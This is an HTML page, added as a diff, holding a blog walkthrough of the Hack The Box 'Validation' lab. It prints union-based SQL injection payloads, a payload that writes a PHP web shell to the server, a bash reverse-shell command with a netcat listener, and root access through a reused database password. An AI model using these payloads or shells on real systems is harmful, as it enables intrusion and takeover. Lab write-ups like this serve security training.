@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Validation HTB Walkthrough | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="HTB, Validation, SQLi, MariaDB, second-order SQLi, web shell, privilege escalation, password reuse, web hacking">
+<meta name="description" content="This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.
+Recon
+Started with full port scan:
+ports=$(nmap -p- --min-rate=1000 -T4 &lt;IP&gt; | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+echo $ports
+# 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080
+
+nmap -p$ports -sC -sV 10.10.11.116
+Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2025-04-10-validation/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2025-04-10-validation/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2025-04-10-validation/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="Validation HTB Walkthrough">
+  <meta property="og:description" content="This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.
+Recon Started with full port scan:
+ports=$(nmap -p- --min-rate=1000 -T4 &lt;IP&gt; | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) echo $ports # 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 nmap -p$ports -sC -sV 10.10.11.116 Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-10T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Validation">
+    <meta property="article:tag" content="SQLi">
+    <meta property="article:tag" content="MariaDB">
+    <meta property="article:tag" content="Second-Order SQLi">
+    <meta property="article:tag" content="Web Shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Validation HTB Walkthrough">
+<meta name="twitter:description" content="This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.
+Recon
+Started with full port scan:
+ports=$(nmap -p- --min-rate=1000 -T4 &lt;IP&gt; | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+echo $ports
+# 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080
+
+nmap -p$ports -sC -sV 10.10.11.116
+Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Validation HTB Walkthrough",
+      "item": "https://joonkim0625.github.io/posts/2025-04-10-validation/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Validation HTB Walkthrough",
+  "name": "Validation HTB Walkthrough",
+  "description": "This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.\nRecon Started with full port scan:\nports=$(nmap -p- --min-rate=1000 -T4 \u0026lt;IP\u0026gt; | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) echo $ports # 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 nmap -p$ports -sC -sV 10.10.11.116 Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).\n",
+  "keywords": [
+    "HTB", "Validation", "SQLi", "MariaDB", "second-order SQLi", "web shell", "privilege escalation", "password reuse", "web hacking"
+  ],
+  "articleBody": "This post documents my process for solving the Validation box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.\nRecon Started with full port scan:\nports=$(nmap -p- --min-rate=1000 -T4 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) echo $ports # 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 nmap -p$ports -sC -sV 10.10.11.116 Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).\nSQL Injection Discovery During registration, both username and country are sent. The country parameter is injectable—single quotes caused a MySQL error:\nUncaught Error: Call to a member function fetch_assoc() Confirmed union-based SQL injection:\n' union select null -- (one column) ' union select @@version -- (got 10.5.11-MariaDB-1) database() is registration Enumerated schemas and columns:\nSELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA listed databases union select table_name from information_schema.tables where table_schema='registration' -- revealed registration table Uploading a Web Shell (Second-Order SQLi) Used SQL injection to write a web shell:\nBrazil' UNION SELECT \"\u003c?php SYSTEM($_REQUEST['cmd']); ?\u003e\" INTO OUTFILE '/var/www/html/shell.php'-- - Note: You must visit /account.php after submitting the payload for the injection to take effect (second-order SQLi).\nOnce in place, access the shell:\nhttp://10.10.11.116/shell.php?cmd=id Listing files, found config.php:\n\u003c?php $servername = \"127.0.0.1\"; $username = \"uhc\"; $password = \"uhc-9qual-global-pw\"; $dbname = \"registration\"; $conn = new mysqli($servername, $username, $password, $dbname); ?\u003e Reverse Shell To get a reverse shell, use:\ncurl http://10.10.11.116/shell.php --data-urlencode 'cmd=bash -c \"bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261\"' (Remember to have a listener on your machine: nc -lvnp 4444)\nPrivilege Escalation (Password Reuse) Tried the MySQL credentials as the root password:\nsu - Password: uhc-9qual-global-pw Success! Now running as root, could grab root.txt.\nLessons Learned Test all input fields for SQLi; union-based SQLi remains highly effective. Second-order SQLi: the payload is triggered later, not immediately. Writing a web shell via SQLi is a classic and powerful move. Always read discovered config files for hardcoded credentials. Try passwords everywhere—password reuse is a real-world admin mistake. Writeup based on my exploitation process, with inspiration from CTF and community references.\n",
+  "wordCount" : "340",
+  "inLanguage": "en",
+  "datePublished": "2025-04-10T00:00:00Z",
+  "dateModified": "2025-04-10T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2025-04-10-validation/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Validation HTB Walkthrough
+    </h1>
+    <div class="post-meta"><span title='2025-04-10 00:00:00 +0000 UTC'>April 10, 2025</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><p>This post documents my process for solving the <strong>Validation</strong> box on Hack The Box. This challenge centers on SQL injection, writing a web shell via SQLi, and privilege escalation via password reuse.</p>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<p>Started with full port scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 &lt;IP&gt; | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $ports
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmap -p$ports -sC -sV 10.10.11.116
+</span></span></code></pre></div><p>Main open ports: 22 (SSH), 80 (Apache), 4566 (nginx), 8080 (nginx).</p>
+<h2 id="sql-injection-discovery">SQL Injection Discovery<a hidden class="anchor" aria-hidden="true" href="#sql-injection-discovery">#</a></h2>
+<p>During registration, both <code>username</code> and <code>country</code> are sent. The <code>country</code> parameter is injectable—single quotes caused a MySQL error:</p>
+<pre tabindex="0"><code>Uncaught Error: Call to a member function fetch_assoc()
+</code></pre><p>Confirmed union-based SQL injection:</p>
+<ul>
+<li><code>' union select null -- </code> (one column)</li>
+<li><code>' union select @@version -- </code> (got <code>10.5.11-MariaDB-1</code>)</li>
+<li><code>database()</code> is <code>registration</code></li>
+</ul>
+<p>Enumerated schemas and columns:</p>
+<ul>
+<li><code>SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA</code> listed databases</li>
+<li><code>union select table_name from information_schema.tables where table_schema='registration' -- </code> revealed <code>registration</code> table</li>
+</ul>
+<h2 id="uploading-a-web-shell-second-order-sqli">Uploading a Web Shell (Second-Order SQLi)<a hidden class="anchor" aria-hidden="true" href="#uploading-a-web-shell-second-order-sqli">#</a></h2>
+<p>Used SQL injection to write a web shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Brazil<span style="color:#e6db74">&#39; UNION SELECT &#34;&lt;?php SYSTEM($_REQUEST[&#39;</span>cmd<span style="color:#e6db74">&#39;]); ?&gt;&#34; INTO OUTFILE &#39;</span><span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>shell.php<span style="color:#e6db74">&#39;-- -
+</span></span></span></code></pre></div><p><strong>Note:</strong> You must visit <code>/account.php</code> after submitting the payload for the injection to take effect (second-order SQLi).</p>
+<p>Once in place, access the shell:</p>
+<pre tabindex="0"><code>http://10.10.11.116/shell.php?cmd=id
+</code></pre><p>Listing files, found <code>config.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  $servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>  $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc&#34;</span>;
+</span></span><span style="display:flex;"><span>  $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc-9qual-global-pw&#34;</span>;
+</span></span><span style="display:flex;"><span>  $dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;registration&#34;</span>;
+</span></span><span style="display:flex;"><span>  $conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($servername, $username, $password, $dbname);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="reverse-shell">Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h2>
+<p>To get a reverse shell, use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl http://10.10.11.116/shell.php --data-urlencode <span style="color:#e6db74">&#39;cmd=bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/4444 0&gt;&amp;1&#34;&#39;</span>
+</span></span></code></pre></div><p><em>(Remember to have a listener on your machine: <code>nc -lvnp 4444</code>)</em></p>
+<h2 id="privilege-escalation-password-reuse">Privilege Escalation (Password Reuse)<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-password-reuse">#</a></h2>
+<p>Tried the MySQL credentials as the root password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>su -
+</span></span><span style="display:flex;"><span>Password: uhc-9qual-global-pw
+</span></span></code></pre></div><p>Success! Now running as root, could grab <code>root.txt</code>.</p>
+<h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<ul>
+<li>Test all input fields for SQLi; union-based SQLi remains highly effective.</li>
+<li>Second-order SQLi: the payload is triggered later, not immediately.</li>
+<li>Writing a web shell via SQLi is a classic and powerful move.</li>
+<li>Always read discovered config files for hardcoded credentials.</li>
+<li>Try passwords everywhere—password reuse is a real-world admin mistake.</li>
+</ul>
+<hr>
+<p>Writeup based on my exploitation process, with inspiration from CTF and community references.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/validation/">Validation</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/sqli/">SQLi</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/mariadb/">MariaDB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/second-order-sqli/">Second-Order SQLi</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/web-shell/">Web Shell</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/password-reuse/">Password Reuse</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/web-hacking/">Web Hacking</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
